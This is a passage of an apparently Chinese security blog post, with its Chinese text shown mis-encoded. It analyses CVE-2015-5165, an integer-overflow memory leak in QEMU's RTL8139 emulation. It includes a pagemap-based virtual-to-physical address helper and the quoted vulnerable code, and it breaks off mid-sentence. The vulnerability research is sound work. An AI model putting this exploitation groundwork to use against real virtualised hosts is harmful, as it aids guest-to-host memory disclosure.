å¯ä»¥è®¡ç®—å‡ºè¯¥è™šæ‹Ÿåœ°å€åœ¨ <code>pagemap</code> æ–‡ä»¶ä¸­çš„ç´¢å¼•å€¼ï¼Œ <code>address / 4096 * 8</code> å³å¯¹åº”çš„æ–‡ä»¶åç§»å€¼ï¼›</p></li><li><p>å¯¹ä»»æ„çš„è™šæ‹Ÿåœ°å€ <code>address</code> ï¼Œ<code>address % 4096</code> å³è™šæ‹Ÿåœ°å€åœ¨å¯¹åº”çš„å†…å­˜é¡µä¸­çš„åç§»å€¼ï¼›</p></li><li><p>åŸºäºç‰©ç†å†…å­˜çš„ PFN ä»¥åŠé¡µå†…åç§»ï¼Œå°±å¯ä»¥è®¡ç®—å‡ºå¯¹åº”çš„ç‰©ç†åœ°å€ï¼›</p></li></ol><p>è·å–è™šæ‹Ÿåœ°å€å¯¹åº”çš„ç‰©ç†åœ°å€çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_pfn(<span class="keyword">char</span>* ptr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = <span class="number">-1</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">"/proc/self/pagemap"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> pfn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">    &#123;</span><br><span class="line">        fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">        <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">        &#123;</span><br><span class="line">            pfn &amp;= PFN_PFN;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_addr(<span class="keyword">char</span>* ptr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = get_physical_pfn(ptr);</span><br><span class="line">    <span class="keyword">return</span> pfn * PAGE_SIZE + (<span class="keyword">uint64_t</span>)ptr % PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* ptr = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">"Where am I?"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Physical address: 0x%"</span> PRIx64 <span class="string">"\n"</span>, get_physical_addr(ptr));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Press any key to exit...\n"</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®æ–‡æ¡£ [6] å¯çŸ¥ï¼Œåªæœ‰æ‹¥æœ‰ <code>CAP_SYS_ADMIN</code> æƒé™çš„è¿›ç¨‹æ‰å¯ä»¥è¯»å–åˆ° PFNï¼Œå¦åˆ™è™½ç„¶å¯ä»¥æ‰“å¼€ <code>pagemap</code> æ–‡ä»¶ï¼Œä½†æ˜¯è¯»å–åˆ°çš„ PFN å°†ä¼šæ˜¯ <code>0</code> ã€‚</p><blockquote><p>Since Linux 4.0 only users with the CAP_SYS_ADMIN capability can get PFNs.<br>In 4.0 and 4.1 opens by unprivileged fail with -EPERM.  Starting from<br>4.2 the PFN field is zeroed if the user does not have CAP_SYS_ADMIN.<br>Reason: information about PFNs helps in exploiting Rowhammer vulnerability.</p></blockquote><p>ç¼–è¯‘å¥½ç¨‹åºä¹‹åå°†å…¶ä¸Šä¼ åˆ° QEMU è™šæ‹Ÿæœºä¸­ä»¥ <code>root</code> èº«ä»½æ‰§è¡Œï¼Œæ‰“å°å‡ºç‰©ç†åœ°å€ä¸º <code>0x617192a0</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ./a.out</span></span><br><span class="line">Where am I?</span><br><span class="line">Physical address: 0x617192a0</span><br><span class="line">Press any key to exit...</span><br></pre></td></tr></table></figure><p>åœ¨å®¿ä¸»æœºä¸­ä½¿ç”¨ GDB é™„åŠ åˆ° QEMU è¿›ç¨‹ï¼Œå¯ä»¥çœ‹åˆ°è™šæ‹Ÿæœºä¸­çš„ç‰©ç†åœ°å€å®é™…ä¸Šå°±æ˜¯ QEMU è¿›ç¨‹ä¸ºè™šæ‹Ÿæœºåˆ†é…çš„å†…å­˜æ‰€åœ¨çš„ Host Virtual Address çš„åç§»åœ°å€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo gdb qemu-system-x86 4407</span></span><br><span class="line">(gdb) x /s 0x7fe884000000 + 0x617192a0</span><br><span class="line">0x7fe8e57192a0:"Where am I?"</span><br></pre></td></tr></table></figure><h2 id="0x03-æ¼æ´åˆ†æ"><a href="#0x03-æ¼æ´åˆ†æ" class="headerlink" title="0x03. æ¼æ´åˆ†æ"></a>0x03. æ¼æ´åˆ†æ</h2><h3 id="3-1-æ¼æ´ç®€ä»‹"><a href="#3-1-æ¼æ´ç®€ä»‹" class="headerlink" title="3.1 æ¼æ´ç®€ä»‹"></a>3.1 æ¼æ´ç®€ä»‹</h3><p>CVE-2015-5165 æ˜¯ QEMU åœ¨æ¨¡æ‹Ÿ Realtek RTL8139 ç½‘å¡æ—¶å­˜åœ¨çš„ä¸€ä¸ªæ¼æ´ï¼Œå…·ä½“ä¸ºæ–‡ä»¶ <code>hw\net\rtl8139.c</code> ä¸­çš„å‡½æ•° <code>rtl8139_cplus_transmit_one</code> åœ¨å‘é€æ•°æ®æ—¶æ²¡æœ‰æ£€æŸ¥ IP æ•°æ®åŒ…å¤´éƒ¨çš„é•¿åº¦ <code>hlen</code> ä¸æ•´ä¸ª IP æ•°æ®åŒ…çš„é•¿åº¦ <code>ip-&gt;ip_len</code> ä¹‹é—´çš„å…³ç³»ï¼Œå¯¼è‡´åœ¨è®¡ç®—æ•°æ®é•¿åº¦çš„æ—¶å€™å­˜åœ¨æ•´æ•°æº¢å‡ºï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*uint16_t*/</span> ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¯¥æ¼æ´å¯ä»¥æŠŠè¶Šç•Œè¯»å–åˆ°çš„æ•°æ®é€šè¿‡ç½‘ç»œå‘é€å‡ºå»ã€‚</p><h3 id="3-2-åŸºç¡€çŸ¥è¯†"><a href="#3-2-åŸºç¡€çŸ¥è¯†" class="headerlink" title="3.2 åŸºç¡€çŸ¥è¯†"></a>3.2 åŸºç¡€çŸ¥è¯†</h3><h4 id="3-2-1-Ethernet-Frame-Format"><a href="#3-2-1-Ethernet-Frame-Format" class="headerlink" title="3.2.1 Ethernet Frame Format"></a>3.2.1 Ethernet Frame Format</h4><p>OSIï¼ˆOpen Systems Interconnectionï¼‰å°†ç½‘ç»œåè®®åˆ†ä¸ºä¸ƒå±‚ï¼Œä»ä¸Šå¾€ä¸‹ä¾æ¬¡ä¸ºï¼š</p><ul><li>åº”ç”¨å±‚</li><li>è¡¨ç¤ºå±‚</li><li>ä¼šè¯å±‚</li><li>ä¼ è¾“å±‚</li><li>ç½‘ç»œå±‚</li><li>æ•°æ®é“¾è·¯å±‚</li><li>ç‰©ç†å±‚</li></ul><p>ä»¥å¤ªç½‘å¸§ï¼ˆEthernet Frameï¼‰åœ¨æ•°æ®é“¾è·¯å±‚ä¼ è¾“ï¼Œæ ¼å¼å‚è€ƒä¸‹å›¾ä¸­çš„ç°è‰²éƒ¨åˆ† [7]ï¼š</p><p><img src="/uploads/202006/ethernet-frame.png" alt="Ethernet Frame Format"></p><p>ç›¸å…³å­—æ®µè§£é‡Šï¼š</p><ul><li>DST / SRC ä¸ºç›®æ ‡ / æºçš„ MAC åœ°å€</li><li><p>Length / Typeï¼š</p><ul><li>å¦‚æœå€¼å°äºç­‰äº <code>1500</code> ï¼Œåˆ™è¡¨ç¤º Payload çš„é•¿åº¦</li><li>å¦åˆ™è¡¨ç¤º Payload æ•°æ®æ‰€ä½¿ç”¨çš„åè®®ï¼Œæ¯”å¦‚ <code>0x0800</code> è¡¨ç¤º IP åè®®ï¼ˆè¿™é‡ŒæŒ‡ IPv4ï¼‰</li></ul></li><li><p>Payload çš„ MTUï¼ˆMaximum Transmission Unitï¼‰ä¸º <code>1500</code> å­—èŠ‚ï¼Œå½“æ•°æ®è¶…å‡º MTU æ—¶éœ€è¦è¿›è¡Œåˆ†ç‰‡å¤„ç†</p></li></ul><h4 id="3-2-2-IP-Packet-Format"><a href="#3-2-2-IP-Packet-Format" class="headerlink" title="3.2.2 IP Packet Format"></a>3.2.2 IP Packet Format</h4><p>IP æ•°æ®åŒ…ï¼ˆè¿™é‡ŒæŒ‡ IPv4ï¼‰åœ¨ç½‘ç»œå±‚ä¼ è¾“ï¼Œæ ¼å¼å‚è€ƒä¸‹å›¾ [7]ï¼š</p><p><img src="/uploads/202006/ip-packet.png" alt="IP Packet Format"></p><p>ç›¸å…³å­—æ®µè§£é‡Šï¼š</p><ul><li>IHLï¼ˆInternet Header Lengthï¼‰è¡¨ç¤º IP Header çš„é•¿åº¦ï¼Œæœ€å¤§å¯ä»¥æ˜¯ <code>0b1111 * 4 = 60</code> å­—èŠ‚</li><li>Total Length è¡¨ç¤ºæ•´ä¸ª IP Packet çš„é•¿åº¦ï¼Œæœ€å¤§å¯ä»¥æ˜¯ <code>65535</code> å­—èŠ‚</li><li>IP Data çš„æœ€å¤§é•¿åº¦ä¸º <code>65535 - 20 = 65515</code> å­—èŠ‚<ul><li>æ­¤æ—¶ IP Header çš„é•¿åº¦ä¸º <code>20</code> å­—èŠ‚ï¼ŒOptions å­—æ®µçš„é•¿åº¦ä¸º <code>0</code> å­—èŠ‚</li></ul></li></ul><h4 id="3-2-3-TCP-Segment-Format"><a href="#3-2-3-TCP-Segment-Format" class="headerlink" title="3.2.3 TCP Segment Format"></a>3.2.3 TCP Segment Format</h4><p>TCP æŠ¥æ–‡åœ¨ä¼ è¾“å±‚ä¼ è¾“ï¼Œæ ¼å¼å‚è€ƒä¸‹å›¾ [7]ï¼š</p><p><img src="/uploads/202006/tcp-segment.png" alt="TCP Segment Format"></p><p>å’Œ IP æ•°æ®åŒ…ä¸€æ ·ï¼ŒTCP æŠ¥æ–‡å¤´éƒ¨çš„é•¿åº¦ç”± <code>Header Length</code> å­—æ®µæŒ‡æ˜ï¼Œæœ€å¤§å¯ä»¥æ˜¯ <code>0b1111 * 4 = 60</code> å­—èŠ‚ï¼Œåœ¨ <code>Options</code> å­—æ®µä¸ºç©ºçš„æƒ…å†µä¸‹å¤´éƒ¨é•¿åº¦ä¸º <code>20</code> å­—èŠ‚ã€‚</p><h3 id="3-3-æ¼æ´åˆ†æ"><a href="#3-3-æ¼æ´åˆ†æ" class="headerlink" title="3.3 æ¼æ´åˆ†æ"></a>3.3 æ¼æ´åˆ†æ</h3><p>æ¼æ´ä½äºæ–‡ä»¶ <code>hw\net\rtl8139.c</code> ä¸­çš„å‡½æ•° <code>rtl8139_cplus_transmit_one</code> ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETHER_ADDR_LEN 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETHER_TYPE_LEN 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_HLEN (ETHER_ADDR_LEN * 2 + ETHER_TYPE_LEN)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_P_IP    0x0800      <span class="comment">/* Internet Protocol packet */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_P_8021Q 0x8100      <span class="comment">/* 802.1Q VLAN Extended Header  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_MTU     1500</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ip packet header */</span></span><br><span class="line">ip_header *ip = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> hlen = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint8_t</span>  ip_protocol = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint16_t</span> ip_data_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> *eth_payload_data = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span>   eth_payload_len  = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// saved_buffer æŒ‡å‘ Ethernet Frame, è¿™é‡Œè¯»å– Length/Type å­—æ®µ</span></span><br><span class="line"><span class="keyword">int</span> proto = be16_to_cpu(*(<span class="keyword">uint16_t</span> *)(saved_buffer + <span class="number">12</span>));</span><br><span class="line"><span class="keyword">if</span> (proto == ETH_P_IP)  <span class="comment">// Payload ä¸º IP Packet</span></span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">"+++ C+ mode has IP packet\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* not aligned */</span></span><br><span class="line">    eth_payload_data = saved_buffer + ETH_HLEN; <span class="comment">// Payload æ•°æ®</span></span><br><span class="line">    eth_payload_len  = saved_size   - ETH_HLEN; <span class="comment">// Payload å¤§å°</span></span><br><span class="line"></span><br><span class="line">    ip = (ip_header*)eth_payload_data;          <span class="comment">// IP Packet</span></span><br><span class="line">    <span class="comment">// æ£€æŸ¥æ˜¯å¦ä¸º IPv4</span></span><br><span class="line">    <span class="keyword">if</span> (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) &#123;</span><br><span class="line">        DPRINTF(<span class="string">"+++ C+ mode packet has bad IP version %d "</span></span><br><span class="line">            <span class="string">"expected %d\n"</span>, IP_HEADER_VERSION(ip),</span><br><span class="line">            IP_HEADER_VERSION_4);</span><br><span class="line">        ip = <span class="literal">NULL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        hlen = IP_HEADER_LENGTH(ip);            <span class="comment">// IP å¤´é•¿åº¦</span></span><br><span class="line">        ip_protocol = ip-&gt;ip_p;</span><br><span class="line">        <span class="comment">// è®¡ç®— IP æ•°æ®åŒ…ä¸­æ•°æ®çš„é•¿åº¦, è¿™é‡Œ ip_data_len çš„ç±»å‹ä¸º uint16_t</span></span><br><span class="line">        <span class="comment">// å½“ be16_to_cpu(ip-&gt;ip_len) &lt; hlen è§¦å‘æ•´æ•°æº¢å‡º</span></span><br><span class="line">        <span class="comment">// ip_data_len æœ€å¤§å¯ä»¥æ˜¯ 0xFFFF</span></span><br><span class="line">        ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°è¯•ä» Ethernet Frame ä¸­è§£æ IPv4 æ•°æ®åŒ…ï¼Œåœ¨è®¡ç®— IP æ•°æ®åŒ…ä¸­çš„æ•°æ®é•¿åº¦æ—¶ï¼Œåœ¨è¿›è¡Œå‡æ³•è¿ç®—å‰å¹¶æ²¡æœ‰æ¯”è¾ƒä¸¤ä¸ªæ“ä½œæ•°çš„å¤§å°å…³ç³»ï¼Œé€šè¿‡è§¦å‘æ•´æ•°æº¢å‡ºä½¿å¾— <code>ip_data_len</code> çš„æœ€å¤§å€¼å¯ä»¥æ˜¯ <code>0xFFFF</code> ã€‚</p><p>ç´§æ¥ç€æ˜¯å‘é€æ•°æ®åŒ…ï¼Œå¦‚æœæ˜¯ TCP æ•°æ®ï¼ˆ <code>IP_PROTO_TCP</code> ï¼‰ä¸”æ•°æ®é‡è¿‡å¤§ï¼ˆè®¾ç½®äº† <code>CP_TX_LGSEN</code> æ ‡è®°ï¼‰ï¼Œåˆ™ä¼šè¿›è¡Œåˆ†ç‰‡å¤„ç†ï¼Œå³åˆ‡åˆ†æˆå¤šä¸ª IP æ•°æ®åŒ…è¿›è¡Œå‘é€ï¼›æ­¤æ—¶ <code>ip_data_len</code> å°†è¢«ç”¨äºè®¡ç®— <code>tcp_data_len</code> çš„å€¼ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pointer to TCP header */</span></span><br><span class="line">tcp_header *p_tcp_hdr = (tcp_header*)(eth_payload_data + hlen);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tcp_hlen = TCP_HEADER_DATA_OFFSET(p_tcp_hdr);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ETH_MTU = ip header len + tcp header len + payload */</span></span><br><span class="line"><span class="keyword">int</span> tcp_data_len = ip_data_len - tcp_hlen;</span><br><span class="line"><span class="keyword">int</span> tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;</span><br></pre></td></tr></table></figure><p>éšåå¯¹ <code>tcp_data_len</code> é•¿åº¦çš„æ•°æ®æŒ‰ç…§ <code>tcp_chunk_size</code> çš„å¤§å°è¿›è¡Œåˆ†ç‰‡å‘é€ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> is_last_frame = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (tcp_send_offset = <span class="number">0</span>; tcp_send_offset &lt; tcp_data_len; </span><br><span class="line">     tcp_send_offset += tcp_chunk_size) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> chunk_size = tcp_chunk_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check if this is the last frame */</span></span><br><span class="line">    <span class="keyword">if</span> (tcp_send_offset + tcp_chunk_size &gt;= tcp_data_len)</span><br><span class="line">    &#123;</span><br><span class="line">        is_last_frame = <span class="number">1</span>;</span><br><span class="line">        chunk_size = tcp_data_len - tcp_send_offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* add 4 TCP pseudoheader fields */</span></span><br><span class="line">    <span class="comment">/* copy IP source and destination fields */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(data_to_checksum, saved_ip_header + <span class="number">12</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcp_send_offset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen, </span><br><span class="line">            (<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen + tcp_send_offset, chunk_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* keep PUSH and FIN flags only for the last frame */</span></span><br><span class="line">    <span class="keyword">if</span> (!is_last_frame)</span><br><span class="line">    &#123;</span><br><span class="line">        TCP_HEADER_CLEAR_FLAGS(p_tcp_hdr, TCP_FLAG_PUSH|TCP_FLAG_FIN);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* recalculate TCP checksum */</span></span><br><span class="line">    ip_pseudo_header *p_tcpip_hdr = (ip_pseudo_header *)data_to_checksum;</span><br><span class="line">    p_tcpip_hdr-&gt;zeros      = <span class="number">0</span>;</span><br><span class="line">    p_tcpip_hdr-&gt;ip_proto   = IP_PROTO_TCP;</span><br><span class="line">    p_tcpip_hdr-&gt;ip_payload = cpu_to_be16(tcp_hlen + chunk_size);</span><br><span class="line"></span><br><span class="line">    p_tcp_hdr-&gt;th_sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> tcp_checksum = ip_checksum(data_to_checksum, tcp_hlen + chunk_size + <span class="number">12</span>);</span><br><span class="line">    p_tcp_hdr-&gt;th_sum = tcp_checksum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* restore IP header */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(eth_payload_data, saved_ip_header, hlen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* set IP data length and recalculate IP checksum */</span></span><br><span class="line">    ip-&gt;ip_len = cpu_to_be16(hlen + tcp_hlen + chunk_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* increment IP id for subsequent frames */</span></span><br><span class="line">    ip-&gt;ip_id = cpu_to_be16(tcp_send_offset/tcp_chunk_size + be16_to_cpu(ip-&gt;ip_id));</span><br><span class="line"></span><br><span class="line">    ip-&gt;ip_sum = <span class="number">0</span>;</span><br><span class="line">    ip-&gt;ip_sum = ip_checksum(eth_payload_data, hlen);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> tso_send_size = ETH_HLEN + hlen + tcp_hlen + chunk_size;</span><br><span class="line">    rtl8139_transfer_frame(s, saved_buffer, tso_send_size,</span><br><span class="line">        <span class="number">0</span>, (<span class="keyword">uint8_t</span> *) dot1q_buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* add transferred count to TCP sequence number */</span></span><br><span class="line">    p_tcp_hdr-&gt;th_seq = cpu_to_be32(chunk_size + be32_to_cpu(p_tcp_hdr-&gt;th_seq));</span><br><span class="line">    ++send_count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°è£…å¥½çš„ Ethernet Frame é€šè¿‡å‡½æ•° <code>rtl8139_transfer_frame</code> å‘é€ï¼Œå‡½æ•°éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_transfer_frame</span><span class="params">(RTL8139State *s, <span class="keyword">uint8_t</span> *buf, <span class="keyword">int</span> size,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> do_interrupt, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *dot1q_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ------------------------------- cut -------------------------------</span></span><br><span class="line">    <span class="keyword">if</span> (TxLoopBack == (s-&gt;TxConfig &amp; TxLoopBack))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> buf2_size;</span><br><span class="line">        <span class="keyword">uint8_t</span> *buf2;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (iov) &#123;</span><br><span class="line">            buf2_size = iov_size(iov, <span class="number">3</span>);</span><br><span class="line">            buf2 = g_malloc(buf2_size);</span><br><span class="line">            iov_to_buf(iov, <span class="number">3</span>, <span class="number">0</span>, buf2, buf2_size);</span><br><span class="line">            buf = buf2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">"+++ transmit loopback mode\n"</span>);</span><br><span class="line">        rtl8139_do_receive(qemu_get_queue(s-&gt;nic), buf, size, do_interrupt);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (iov) &#123;</span><br><span class="line">            g_free(buf2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ------------------------------- cut -------------------------------</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼Œå½“è®¾ç½®äº† <code>TxLoopBack</code> æ 